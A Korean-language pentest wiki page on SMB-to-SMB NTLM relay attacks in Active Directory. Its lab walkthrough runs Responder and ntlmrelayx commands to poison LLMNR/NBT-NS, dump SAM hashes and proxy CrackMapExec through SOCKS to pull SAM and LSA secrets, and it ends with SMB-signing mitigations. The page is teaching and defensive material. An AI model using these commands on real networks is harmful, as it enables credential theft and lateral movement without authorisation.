# SMB to SMB

### **SMB to SMB 릴레이**&#x20;

LLMNR/NBT-NS, MITM6, 강제 인증 등으로 통해 들어오는 SMB 기반 인증 트래픽을 다른 SMB 서비스에게 릴레이하는 공격이다. 이 릴레이 공격을 바탕으로 타겟 호스트의 SAM 데이터베이스를 덤프하거나, SOCKS Proxy를 구축하거나, 원격 코드를 실행할 수 있다.&#x20;

NTLM 릴레이 공격을 하려면 3개의 구성요소가 필요하다.&#x20;

1. 릴레이 호스트 - 사용자 인증 트래픽을 공격자 호스트에게 보내는, 릴레이를 "할" 호스트&#x20;
2. 공격자 호스 - 중간자 포지션에서 릴레이 공격을 실행하는 호스트&#x20;
3. 타겟 호스트 - 공격자로부터 릴레이 호스트의 트래픽을 받는, 릴레이 공격을 "당할" 호스트. SMB Signing 이 비활성화 되어 있어야 릴레이가 가능하다. &#x20;



SMB to SMB 릴레이 때는 트리거된 인증 트래픽의 유저가 타겟 호스트의 로컬 관리자 (Local Administrator) 권한을 갖고 있어야 유용한 정보를 얻을 때가 많다. 따라서 머신 계정의 인증 트래픽을 받는 강제 인증을 트리거로 사용하면 SMB to SMB 릴레이는 큰 도움이 안될때가 많다. 머신 계정은 특별한 설정이 있지 않는 한 로컬 관리자 권한이 없기 때문이다.&#x20;

* **예 - 성공)** 도메인 어드민이 트리거한 LLMNR/NBT-NS 포이즈닝 -> 릴레이 -> 타겟 호스트의 SAM Dump  성공. 도메인 어드민은 왠만한 타겟 호스트들의 로컬 관리자 권한을 갖고 있기 때문.&#x20;
* **예 - 실패)** 도메인 컨트롤러의 Petitpotam 을 이용한 강제 인증 트리거 -> 릴레이 -> 타겟 호스트의 SAM Dump 실패. 도메인 컨트롤러의 머신 계정은 타겟 호스트의 로컬 관리자 권한이 없기 때문.&#x20;
* **예 - 성공)** 타겟 호스트의 로컬 관리자 권한을 갖고 있는 도메인 유저 계정이 트리거한 LLMNR/NBT-NS 포이즈닝 -> 릴레이 -> 타겟 호스트의 SAM Dump 성공!&#x20;



### 실습&#x20;

NTLM 릴레이 공격은 다음과 같은 순서로 이뤄진다.&#x20;

1. SMB Signing 이 비활화 되어 있는 타겟 호스트를 찾는다.
2. LLMNR/NBT-NS, 강제 인증, MITM6 등의 방법으로 릴레이 공격을 시작한다.&#x20;
3. `Ntlmrelayx` 등의 툴을 써서 들어오는 인증 트래픽을 #1 에서 찾은 타겟호스트들로 릴레이 공격을 한다. 공격 방법은 다음과 같다:&#x20;
   1. SAM 데이터베이스 덤프 - `ntlmrelayx` 의 기본적인 공격이다. &#x20;
   2. SOCKS proxy - SOCKS 프록시를 구축한다.&#x20;
   3. ADCS - ADCS 관련 공격을 시도해 인증서 등을 발급받는다.&#x20;
   4. Command Execution - 명령어를 실행한다.

#### 1. SMB Signing 비활성화 되어 있는 호스트 찾기&#x20;

릴레이 공격에 앞서 SMB Signing 이 비활성화 되어 있는 타겟 호스트들을 찾는다.&#x20;

```
# SMB Signing 비활성화 호스트 찾기 
cme smb <file/CIDR/target> --gen-relay relay.txt 

# 예시 
cme smb 192.168.40.150/26 --gen-relay relay.txt
SMB         192.168.40.151  445    WKSTN01          [*] Windows 10.0 Build 19041 x64 (name:WKSTN01) (domain:choi.local) (signing:False) (SMBv1:False)
SMB         192.168.40.150  445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:choi.local) (signing:True) (SMBv1:False)
```



#### 2-1. LLMNR/NBT-NS 포이즈닝 + SMB to SMB 릴레이 공격 - SAM Dump&#x20;

위에서 `192.168.40.151` 호스트의 `SMB Signing: False` 설정을 확인했다. 이를 바탕으로 LLMNR/NBT-NS 포이즈닝 + SMB to SMB 릴레이 공격을 시도한다.&#x20;

```
# 1. ntlmrelayx 세팅
python3 ntlmrelayx.py -tf <relay-file> -smb2support 
python3 ntlmrelayx.py -tf ~/relay.txt -smb2support 

# 2. Responder 세팅 
responder -I <NIC> -v 
responder -I eth1 -v 

# 3. < LLMNR / NBT-NS 트리거 - 실습에서는 explorer에서 존재하지 않은 호스트 검색 > 

# Responder 출력 
[*] [MDNS] Poisoned answer sent to ::ffff:192.168.40.150 for name wronghosts.local
[*] [LLMNR]  Poisoned answer sent to ::ffff:192.168.40.150 for name wronghosts

# ntlmrelayx 의 SAM Dump 출력 
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
[*] SMBD-Thread-7 (process_request_thread): Connection from CHOI/ADMINISTRATOR@192.168.40.150 controlled, but there are no more targets left!
Administrator:500:aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:a819c0c224c4e483fe3b5a0df7eb87d8:::
backdoor:1002:aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe:::
[*] Done dumping SAM hashes for host: 192.168.40.151
```



#### 2-2. LLMNR/NBT-NS 포이즈닝 + SMB to SMB 릴레이 공격 - SOCKS 프록시&#x20;

```
# 1. ntlmrelayx 세팅
python3 ntlmrelayx.py -tf <relay-file> -smb2support 
python3 ntlmrelayx.py -tf ~/relay.txt -smb2support 

# 2. Responder 세팅 
responder -I <NIC> -v 
responder -I eth1 -v 

# 3. < LLMNR / NBT-NS 트리거 - 실습에서는 explorer에서 존재하지 않은 호스트 검색 > 

# ntlmrelayx SOCKS 프록시 출력 
[*] SMBD-Thread-9 (process_request_thread): Connection from CHOI/ADMINISTRATOR@192.168.40.150 controlled, attacking target smb://192.168.40.151
[*] Authenticating against smb://192.168.40.151 as CHOI/ADMINISTRATOR SUCCEED
[*] SOCKS: Adding CHOI/ADMINISTRATOR@192.168.40.151(445) to active SOCKS connection. Enjoy

ntlmrelayx> socks
Protocol  Target          Username            AdminStatus  Port 
--------  --------------  ------------------  -----------  ----
SMB       192.168.40.151  CHOI/ADMINISTRATOR  TRUE         445

# 4. proxychain 을 이용해 위에서 얻은 프록시로 명령어 실행 
proxychains crackmapexec smb 192.168.40.151 -u ADMINISTRATOR -p '' -d CHOI          

[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.15
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  192.168.40.151:445  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  192.168.40.151:135 <--denied
SMB         192.168.40.151  445    WKSTN01          [*] Windows 10.0 Build 19041 (name:WKSTN01) (domain:CHOI) (signing:False) (SMBv1:False)
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  192.168.40.151:445  ...  OK
SMB         192.168.40.151  445    WKSTN01          [+] CHOI\ADMINISTRATOR: (Pwn3d!)

# 5. proxychains + cme 콤보 (SAM 덤프, LSA 덤프, share) 
proxychains crackmapexec smb 192.168.40.151 -u ADMINISTRATOR -p '' -d CHOI --sam 
proxychains crackmapexec smb 192.168.40.151 -u ADMINISTRATOR -p '' -d CHOI --lsa 
```

SOCKS 프록시를 이용할 때는 주의할 점은 다음과 같다: &#x20;

1. `/etc/proxychains4.conf` 파일의 끝에 `[ProxyList]`내용을 ntlmrelayx의 기본 SOCKS 프록시 포트인 1080으로 설정해준다.&#x20;
2. proxychains <명령어> 를 사용 할 때는 alias 를 사용할 수 없다. 이전까지 `cme` 를 이용했다면, `proxychains` 를 이용할 때는 `proxychains crackmapexec` 이라고 다 쳐주자.&#x20;
3. proxychains + crackmapexec 을 이용할 때는 유저 이름과 도메인을 ntlmrelayx 에 나온 그대로 설정해준다. ntlmrelayx 에서 `CHOI/ADMINISTRATOR` 로 나왔으니, crackmapexec 도 유저이름은 `ADMINISTRATOR`, 도메인은 `CHOI` 로 설정한다.

```
# /etc/proxychains4.conf 파일에 127.0.0.1 1080 추가 
 
[ProxyList]
# add proxy here ..
# meanwile
# defaults set to "tor"
#socks4         127.0.0.1 9050
socks4 127.0.0.1 1080
```



### 대응 방안&#x20;

* SMB Signing 을 활성화 시켜준다. 윈도우 서버에서는 기본적으로 활성화 되어 있지만, 하위 호환성이나 다른 이유 때문에 비활성화 되어 있는 경우도 있다.
* `Computer Configuration\Policies\Windows Settings\Security Settings\Local Policies\Security Options\Microsoft network server: Digitally Sign communications (always)` 를 활성화 한다.&#x20;
* `Computer Configuration\Policies\Windows Settings\Security Settings\Local Policies\Security Options\Microsoft network server: Digitally Sign communications (if client agrees)` 를 활성화 한다.&#x20;

![](<../../.gitbook/assets/image (10) (2).png>)



### 레퍼런스&#x20;

{% embed url="https://blog.fox-it.com/2017/05/09/relaying-credentials-everywhere-with-ntlmrelayx/" %}

{% embed url="https://www.secureauth.com/blog/playing-with-relayed-credentials/" %}

{% embed url="https://www.trustedsec.com/blog/a-comprehensive-guide-on-relaying-anno-2022/" %}
